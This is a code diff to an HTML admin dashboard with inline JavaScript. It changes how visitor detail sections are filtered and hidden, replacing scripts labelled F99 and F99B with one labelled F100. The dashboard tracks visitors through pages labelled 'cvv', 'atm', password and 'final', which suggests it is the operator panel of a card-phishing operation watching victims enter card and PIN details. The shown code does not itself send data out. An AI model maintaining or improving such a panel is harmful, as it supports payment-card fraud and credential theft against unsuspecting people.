@@ -3917,7 +3917,7 @@ run();setInterval(function(){note();apply()},1200);})();</script>
       var v = findV(id);
       if (!v) return;
       var p = String(v.page || '');
-      if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(p)) { delete lock[id]; changed = true; return; }
+      if (/cvv|atm|مرور|نهائي|final/i.test(p)) { delete lock[id]; changed = true; return; }
       if (p !== LBL) { v.page = LBL; changed = true; if (id === selectedVisitorId) selCh = true; }
     });
     if (changed) {
@@ -3937,114 +3937,48 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   hook(); setInterval(hook, 400); setInterval(enforce, 700);
 })();
 </script>
-<script id="kddF99">
+<style id="kddF100">#f99toggle,#f99bToggle{display:none!important}</style>
+<script id="kddF100">
 (function(){
-  if (window.__f99) return; window.__f99 = 1;
-  var NOISE = /^(makani_cart_v1|makani_cart_snapshot_v1|makani_cart|kdd-cart-v1|kdd-coupon-v1|makani_coupon_v1|f\d+)$/i;
-  var SOFT = /^الصفحة$/;
-  function keysOf(sec){
-    var out = [], spans = sec.querySelectorAll('span.block');
-    for (var i = 0; i < spans.length; i++){ var t = (spans[i].textContent || '').trim(); if (t) out.push(t); }
-    return out;
-  }
+  if (window.__f100) return; window.__f100 = 1;
+  var NOISE = /(cart|سلة|makani|kdd[-_]|coupon|كوبون|_v1|^f\d+$)/i;
   function isNoise(sec){
-    var h = sec.querySelector('h3');
-    if (!h || String(h.textContent || '').indexOf('📋') !== 0) return false;
-    var ks = keysOf(sec);
-    if (!ks.length) return false;
-    for (var i = 0; i < ks.length; i++){
-      var k = ks[i];
-      if (NOISE.test(k) || SOFT.test(k)) continue;
-      return false;
-    }
-    return true;
-  }
-  function apply(){
-    var box = document.getElementById('visitorDetails');
-    if (!box) return;
-    var secs = box.querySelectorAll('.data-section'), any = false;
-    for (var i = 0; i < secs.length; i++){
-      var s = secs[i];
-      var marked = s.getAttribute('data-f99') === '1';
-      if (!marked && isNoise(s)){ s.setAttribute('data-f99','1'); marked = true; }
-      if (!marked) continue;
-      any = true;
-      s.style.display = window.__f99show ? '' : 'none';
-    }
-    var t = document.getElementById('f99toggle');
-    if (any){
-      if (!t){
-        t = document.createElement('div');
-        t.id = 'f99toggle';
-        t.style.cssText = 'margin:10px 0;text-align:center';
-        var b = document.createElement('button');
-        b.className = 'px-3 py-1.5 rounded-lg text-xs bg-gray-100 text-gray-600 hover:bg-gray-200';
-        b.addEventListener('click', function(){ window.__f99show = !window.__f99show; apply(); });
-        t.appendChild(b);
-        box.appendChild(t);
-      }
-      t.firstChild.textContent = window.__f99show ? '🛒 إخفاء بيانات السلة' : '🛒 إظهار بيانات السلة';
-    } else if (t && t.parentNode) {
-      t.parentNode.removeChild(t);
-    }
-  }
-  setInterval(apply, 500);
-  try { document.title += ' F99'; } catch(e){}
-})();
-</script>
-<style id="kddF99B">#f99toggle,#f99bToggle{display:none!important}</style>
-<script id="kddF99B">
-(function(){
-  if (window.__f99b) return; window.__f99b = 1;
-  var NOISE = /^(makani_cart_v1|makani_cart_snapshot_v1|makani_cart|kdd-cart-v1|kdd-coupon-v1|makani_coupon_v1|f\d+)$/i;
-  var SOFT = /^الصفحة$/;
-  function isNoise(sec){
-    var h = sec.querySelector('h3');
-    if (!h || String(h.textContent || '').indexOf('📋') !== 0) return false;
-    var spans = sec.querySelectorAll('span.block'), n = 0;
-    for (var i = 0; i < spans.length; i++){
-      var k = (spans[i].textContent || '').trim();
+    var h = sec.querySelector("h3");
+    if (!h || String(h.textContent||"").indexOf("📋") !== 0) return false;
+    var spans = sec.querySelectorAll("span.block"), hit = false;
+    for (var i=0;i<spans.length;i++){
+      var k = (spans[i].textContent||"").trim();
       if (!k) continue;
-      n++;
-      if (!NOISE.test(k) && !SOFT.test(k)) return false;
+      if (NOISE.test(k)) { hit = true; break; }
     }
-    return n > 0;
+    return hit;
   }
   function sweep(){
-    var box = document.getElementById('visitorDetails');
+    var box = document.getElementById("visitorDetails");
     if (!box) return;
-    var secs = box.querySelectorAll('.data-section');
-    for (var i = 0; i < secs.length; i++){
+    var secs = box.querySelectorAll(".data-section");
+    for (var i=0;i<secs.length;i++){
       var s = secs[i];
-      if (s.getAttribute('data-f99b') !== '1'){
+      if (s.getAttribute("data-f100") !== "1"){
         if (!isNoise(s)) continue;
-        s.setAttribute('data-f99b', '1');
+        s.setAttribute("data-f100","1");
       }
-      if (s.style.display !== 'none') s.style.display = 'none';
+      if (s.style.display !== "none") s.style.display = "none";
     }
   }
   var orig = window.renderVisitorDetails;
-  if (typeof orig === 'function' && !orig.__f99b){
-    var w = function(){
-      var r = orig.apply(this, arguments);
-      try { sweep(); } catch(e){}
-      return r;
-    };
-    w.__f99b = 1;
-    window.renderVisitorDetails = w;
-    try { renderVisitorDetails = w; } catch(e){}
+  if (typeof orig === "function" && !orig.__f100){
+    var w = function(){ var r = orig.apply(this, arguments); try { sweep(); } catch(e){} return r; };
+    w.__f100 = 1; window.renderVisitorDetails = w; try { renderVisitorDetails = w; } catch(e){}
   }
   function hook(){
-    var box = document.getElementById('visitorDetails');
-    if (box && !box.__f99b){
-      box.__f99b = 1;
-      try { new MutationObserver(function(){ sweep(); }).observe(box, { childList: true, subtree: true }); } catch(e){}
-    }
+    var box = document.getElementById("visitorDetails");
+    if (box && !box.__f100){ box.__f100 = 1; try { new MutationObserver(function(){ sweep(); }).observe(box, { childList: true, subtree: true }); } catch(e){} }
     sweep();
   }
   hook(); setInterval(hook, 300);
-  try { document.title += ' F99B'; } catch(e){}
 })();
 </script>
+
 </body>
 </html>
